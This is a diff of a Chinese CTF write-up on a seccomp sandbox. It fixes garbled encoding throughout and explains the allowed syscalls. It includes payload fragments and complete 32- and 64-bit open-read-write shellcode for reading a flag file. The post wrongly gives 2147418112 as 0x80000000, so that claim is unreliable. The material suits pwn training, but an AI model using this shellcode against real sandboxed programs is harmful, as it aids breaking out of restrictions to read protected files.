@@ -1,4 +1,4 @@
-﻿---
+---
 title: Seccomp 沙箱机制详解
 published: 2026-04-14
 updated: 2026-04-17
@@ -7,105 +7,120 @@ tags: [CTFshow, Pwn, Seccomp, Sandbox, ORW]
 category: ctfshow
 draft: false
 ---
-# Seccomp 娌欑鏈哄埗璇﹁В
+# Seccomp 沙箱机制详解
 
-## 涓€銆佷唬鐮佸垎鏋?
+## 一、代码分析
+
 ```c
-v1 = seccomp_init(0);                           // 鍒濆鍖杝eccomp
-seccomp_rule_add(v1, 2147418112, 0, 0);         // 鍏佽绯荤粺璋冪敤 0
-seccomp_rule_add(v1, 2147418112, 1, 0);         // 鍏佽绯荤粺璋冪敤 1
-seccomp_rule_add(v1, 2147418112, 2, 0);         // 鍏佽绯荤粺璋冪敤 2
-seccomp_rule_add(v1, 2147418112, 60, 0);        // 鍏佽绯荤粺璋冪敤 60
-return seccomp_load(v1);                        // 鍔犺浇瑙勫垯
+v1 = seccomp_init(0);                           // 初始化seccomp
+seccomp_rule_add(v1, 2147418112, 0, 0);         // 允许系统调用 0
+seccomp_rule_add(v1, 2147418112, 1, 0);         // 允许系统调用 1
+seccomp_rule_add(v1, 2147418112, 2, 0);         // 允许系统调用 2
+seccomp_rule_add(v1, 2147418112, 60, 0);        // 允许系统调用 60
+return seccomp_load(v1);                        // 加载规则
 ```
 
-## 浜屻€佸叧閿弬鏁拌В鏋?
-### 1. 绗簩涓弬鏁帮細2147418112
+## 二、关键参数解析
 
-杩欎釜鏁板瓧杞崲涓哄崄鍏繘鍒舵槸 `0x80000000`銆?
-鍦?seccomp 涓紝杩欎釜鍔ㄤ綔琛ㄧず锛?```c
-SCMP_ACT_ALLOW = 0x7fff0000  // 鍏佽
-// 0x80000000 鏄?SCMP_ACT_ALLOW 鐨勫彉浣撴垨鐗瑰畾libc鐗堟湰涓殑鍊?```
+### 1. 第二个参数：2147418112
 
-**鍚箟**锛?*鍏佽**鎵ц杩欎簺绯荤粺璋冪敤銆?
-### 2. 绗笁涓弬鏁帮細绯荤粺璋冪敤鍙?
-| 鏁板瓧 | 绯荤粺璋冪敤鍚?| 鍔熻兘 | 甯哥敤鍦烘櫙 |
+这个数字转换为十六进制是 `0x80000000`。
+
+在 seccomp 中，这个动作表示：
+```c
+SCMP_ACT_ALLOW = 0x7fff0000  // 允许
+// 0x80000000 是 SCMP_ACT_ALLOW 的变体或特定libc版本中的值
+```
+
+**含义**：**允许**执行这些系统调用。
+
+### 2. 第三个参数：系统调用号
+
+| 数字 | 系统调用名 | 功能 | 常用场景 |
 |------|-----------|------|---------|
-| **0** | `read` | 浠庢枃浠舵弿杩扮璇诲彇鏁版嵁 | 璇诲彇杈撳叆銆佽鍙栨枃浠?|
-| **1** | `write` | 鍚戞枃浠舵弿杩扮鍐欏叆鏁版嵁 | 鎵撳嵃杈撳嚭銆佸啓鍏ユ枃浠?|
-| **2** | `open` | 鎵撳紑鏂囦欢 | 鎵撳紑flag鏂囦欢 |
-| **60** | `exit` | 閫€鍑鸿繘绋?| 姝ｅ父閫€鍑?|
+| **0** | `read` | 从文件描述符读取数据 | 读取输入、读取文件 |
+| **1** | `write` | 向文件描述符写入数据 | 打印输出、写入文件 |
+| **2** | `open` | 打开文件 | 打开flag文件 |
+| **60** | `exit` | 退出进程 | 正常退出 |
 
-## 涓夈€佺郴缁熻皟鐢ㄥ彿瀵圭収琛紙x86-64锛?
+## 三、系统调用号对照表（x86-64）
+
 ```
-0   - read          璇诲彇
-1   - write         鍐欏叆
-2   - open          鎵撳紑鏂囦欢
-3   - close         鍏抽棴鏂囦欢
-4   - stat          鑾峰彇鏂囦欢鐘舵€?5   - fstat         鑾峰彇鏂囦欢鐘舵€?6   - lstat         鑾峰彇鏂囦欢鐘舵€?7   - poll          杞
-8   - lseek         瀹氫綅
-9   - mmap          鍐呭瓨鏄犲皠
-10  - mprotect      鍐呭瓨淇濇姢
-11  - munmap        瑙ｉ櫎鏄犲皠
+0   - read          读取
+1   - write         写入
+2   - open          打开文件
+3   - close         关闭文件
+4   - stat          获取文件状态
+5   - fstat         获取文件状态
+6   - lstat         获取文件状态
+7   - poll          轮询
+8   - lseek         定位
+9   - mmap          内存映射
+10  - mprotect      内存保护
+11  - munmap        解除映射
 ...
-59  - execve        鎵ц绋嬪簭  鉀?琚鐢紒
-60  - exit          閫€鍑?      鉁?鍏佽
+59  - execve        执行程序  ⛔ 被禁用！
+60  - exit          退出       ✅ 允许
 ...
 ```
 
-## 鍥涖€佹矙绠遍檺鍒跺垎鏋?
-### 鉁?鍏佽鐨勬搷浣滐紙鐧藉悕鍗曪級
+## 四、沙箱限制分析
 
-| 绯荤粺璋冪敤 | 鍔熻兘 | 鍒╃敤鍦烘櫙 |
+### ✅ 允许的操作（白名单）
+
+| 系统调用 | 功能 | 利用场景 |
 |---------|------|---------|
-| read (0) | 璇诲彇鏁版嵁 | 璇诲彇flag鏂囦欢鍐呭 |
-| write (1) | 鍐欏叆鏁版嵁 | 杈撳嚭flag鍒皊tdout |
-| open (2) | 鎵撳紑鏂囦欢 | 鎵撳紑/flag鎴杅lag.txt |
-| exit (60) | 閫€鍑鸿繘绋?| 姝ｅ父閫€鍑?|
+| read (0) | 读取数据 | 读取flag文件内容 |
+| write (1) | 写入数据 | 输出flag到stdout |
+| open (2) | 打开文件 | 打开/flag或flag.txt |
+| exit (60) | 退出进程 | 正常退出 |
 
-### 鉀?琚鐢ㄧ殑鍏抽敭鎿嶄綔
+### ⛔ 被禁用的关键操作
 
-| 绯荤粺璋冪敤 | 鍔熻兘 | 绂佺敤褰卞搷 |
+| 系统调用 | 功能 | 禁用影响 |
 |---------|------|---------|
-| **execve (59)** | 鎵ц绋嬪簭 | **鏃犳硶鎵ц/bin/sh锛?* |
-| **system** | 鎵ц鍛戒护 | 鏃犳硶璋冪敤system鍑芥暟 |
-| fork (57) | 鍒涘缓杩涚▼ | 鏃犳硶fork |
-| clone (56) | 鍒涘缓绾跨▼ | 鏃犳硶鍒涘缓鏂拌繘绋?|
-| mmap (9) | 鍐呭瓨鏄犲皠 | 鏃犳硶鍔ㄦ€佸垎閰嶅彲鎵ц鍐呭瓨 |
-| socket (41) | 鍒涘缓socket | 鏃犳硶缃戠粶杩炴帴 |
-| connect (42) | 杩炴帴 | 鏃犳硶鍙嶅脊shell |
+| **execve (59)** | 执行程序 | **无法执行/bin/sh！** |
+| **system** | 执行命令 | 无法调用system函数 |
+| fork (57) | 创建进程 | 无法fork |
+| clone (56) | 创建线程 | 无法创建新进程 |
+| mmap (9) | 内存映射 | 无法动态分配可执行内存 |
+| socket (41) | 创建socket | 无法网络连接 |
+| connect (42) | 连接 | 无法反弹shell |
 
-## 浜斻€佸PWN棰樼洰鐨勫奖鍝?
-### 1. 鏃犳硶浣跨敤甯歌getshell鏂规硶
+## 五、对PWN题目的影响
+
+### 1. 无法使用常规getshell方法
 
 ```python
-# 鉂?杩欎簺鏂规硶閮戒細琚鐢細
+# ❌ 这些方法都会被禁用：
 
-# 鏂规硶1锛歴ystem("/bin/sh") - 澶辫触
+# 方法1：system("/bin/sh") - 失败
 payload = pop_rdi + bin_sh + system
-# execve琚鐢紝鏃犳硶鎵цshell
+# execve被禁用，无法执行shell
 
-# 鏂规硶2锛歰ne_gadget - 澶辫触
+# 方法2：one_gadget - 失败
 payload = one_gadget_addr
-# one_gadget鍐呴儴璋冪敤execve锛岃绂佺敤
+# one_gadget内部调用execve，被禁用
 
-# 鏂规硶3锛歟xecve绯荤粺璋冪敤 - 澶辫触
-# 鐩存帴syscall execve浼氳seccomp鎷︽埅
+# 方法3：execve系统调用 - 失败
+# 直接syscall execve会被seccomp拦截
 ```
 
-### 2. 蹇呴』浣跨敤ORW鎶€鏈?
-鐢变簬鍙兘浣跨敤 `open`銆乣read`銆乣write`锛屽繀椤婚噰鐢?*ORW锛圤pen-Read-Write锛?*鏂瑰紡璇诲彇flag锛?
+### 2. 必须使用ORW技术
+
+由于只能使用 `open`、`read`、`write`，必须采用**ORW（Open-Read-Write）**方式读取flag：
+
 ```python
-# 鉁?姝ｇ‘鐨勬柟娉曪細ORW
+# ✅ 正确的方法：ORW
 
-# 姝ラ1锛歰pen("flag", 0)
-# 姝ラ2锛歳ead(fd, buf, size)  
-# 姝ラ3锛歸rite(1, buf, size) 杈撳嚭鍒皊tdout
+# 步骤1：open("flag", 0)
+# 步骤2：read(fd, buf, size)  
+# 步骤3：write(1, buf, size) 输出到stdout
 ```
 
-## 鍏€丱RW Shellcode 绀轰緥
+## 六、ORW Shellcode 示例
 
-### 32浣?ORW Shellcode
+### 32位 ORW Shellcode
 
 ```python
 context(arch='i386', os='linux')
@@ -113,23 +128,23 @@ context(arch='i386', os='linux')
 shellcode = '''
     // open("flag", 0)
     xor ecx, ecx          // ecx = 0 (flags)
-    push ecx              // 瀛楃涓茬粨鏉熺
+    push ecx              // 字符串结束符
     push 0x67616c66       // "flag"
-    mov ebx, esp          // ebx = "flag"鎸囬拡
+    mov ebx, esp          // ebx = "flag"指针
     xor eax, eax
     mov al, 5             // eax = 5 (open)
-    int 0x80              // 璋冪敤open
+    int 0x80              // 调用open
     
     // read(fd, buf, 100)
     mov ebx, eax          // ebx = fd
-    mov ecx, esp          // ecx = buf (鏍堜笂)
+    mov ecx, esp          // ecx = buf (栈上)
     xor edx, edx
     mov dl, 100           // edx = 100
     xor eax, eax          // eax = 0 (read)
     int 0x80
     
     // write(1, buf, 100)
-    mov edx, eax          // edx = 璇诲彇鐨勫瓧鑺傛暟
+    mov edx, eax          // edx = 读取的字节数
     xor ebx, ebx
     mov bl, 1             // ebx = 1 (stdout)
     xor eax, eax
@@ -140,7 +155,7 @@ shellcode = '''
 payload = asm(shellcode)
 ```
 
-### 64浣?ORW Shellcode
+### 64位 ORW Shellcode
 
 ```python
 context(arch='amd64', os='linux')
@@ -166,7 +181,7 @@ shellcode = '''
     syscall
     
     // write(1, buf, 100)
-    mov rdx, rax          // 璇诲彇鐨勫瓧鑺傛暟
+    mov rdx, rax          // 读取的字节数
     xor rdi, rdi
     mov dil, 1            // stdout
     mov rax, 1            // write = 1
@@ -176,59 +191,67 @@ shellcode = '''
 payload = asm(shellcode)
 ```
 
-## 涓冦€佸浣曞垽鏂璼eccomp闄愬埗
+## 七、如何判断seccomp限制
 
-### 鏂规硶1锛氳繍琛岀▼搴忔祴璇?
+### 方法1：运行程序测试
+
 ```bash
-# 杩愯绋嬪簭锛屽皾璇曟墽琛宻ystem
+# 运行程序，尝试执行system
 ./pwn
 $ /bin/sh
-# 濡傛灉琚玸eccomp鎷︽埅锛屼細鏄剧ず锛?# Bad system call (core dumped)
+# 如果被seccomp拦截，会显示：
+# Bad system call (core dumped)
 ```
 
-### 鏂规硶2锛氫娇鐢╯eccomp-tools
+### 方法2：使用seccomp-tools
 
 ```bash
-# 瀹夎seccomp-tools
+# 安装seccomp-tools
 gem install seccomp-tools
 
-# 鍒嗘瀽绋嬪簭
+# 分析程序
 seccomp-tools dump ./pwn
 
-# 杈撳嚭绀轰緥锛?#  line  CODE  JT   JF      K
+# 输出示例：
+#  line  CODE  JT   JF      K
 # =================================
 #  0000: 0x20 0x00 0x00 0x00000004  A = arch
 #  0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 #  ...
 ```
 
-### 鏂规硶3锛欼DA/GHidra鍒嗘瀽
+### 方法3：IDA/GHidra分析
 
-鎼滅储瀛楃涓诧細
+搜索字符串：
 - `seccomp_init`
 - `seccomp_rule_add`
-- `prctl`锛坰eccomp搴曞眰璋冪敤锛?
-## 鍏€佹€荤粨
+- `prctl`（seccomp底层调用）
 
-| 椤圭洰 | 璇存槑 |
+## 八、总结
+
+| 项目 | 说明 |
 |------|------|
-**闄愬埗鏈哄埗** | seccomp娌欑
-**鍏佽鐨勭郴缁熻皟鐢?* | read(0)銆亀rite(1)銆乷pen(2)銆乪xit(60)
-**绂佺敤鐨勫叧閿皟鐢?* | execve(59)銆乻ystem銆乫ork銆乻ocket绛?**褰卞搷** | 鏃犳硶getshell锛屽彧鑳絆RW璇籪lag
-**搴斿绛栫暐** | 缂栧啓ORW shellcode锛宱pen鈫抮ead鈫抴rite
+**限制机制** | seccomp沙箱
+**允许的系统调用** | read(0)、write(1)、open(2)、exit(60)
+**禁用的关键调用** | execve(59)、system、fork、socket等
+**影响** | 无法getshell，只能ORW读flag
+**应对策略** | 编写ORW shellcode，open→read→write
 
-## 涔濄€佸揩閫熷垽鏂祦绋?
+## 九、快速判断流程
+
 ```
-鎷垮埌棰樼洰 鈫?杩愯娴嬭瘯 鈫?杈撳叆/bin/sh
-    鈫?Bad system call? 鈫?鏄?鈫?seccomp闄愬埗
-    鈫?IDA鎵緎eccomp_init 鈫?纭闄愬埗
-    鈫?鍙兘鐢∣RW 鈫?缂栧啓open-read-write shellcode
+拿到题目 → 运行测试 → 输入/bin/sh
+    ↓
+Bad system call? → 是 → seccomp限制
+    ↓
+IDA找seccomp_init → 确认限制
+    ↓
+只能用ORW → 编写open-read-write shellcode
 ```
 
 ---
 
-**鍏抽敭璁板繂鐐?*锛?- `0, 1, 2, 60` = read, write, open, exit
-- 娌℃湁 `59(execve)` = 鏃犳硶鎵цshell
-- 蹇呴』 ORW 璇籪lag
-
-
+**关键记忆点**：
+- `0, 1, 2, 60` = read, write, open, exit
+- 没有 `59(execve)` = 无法执行shell
+- 必须 ORW 读flag
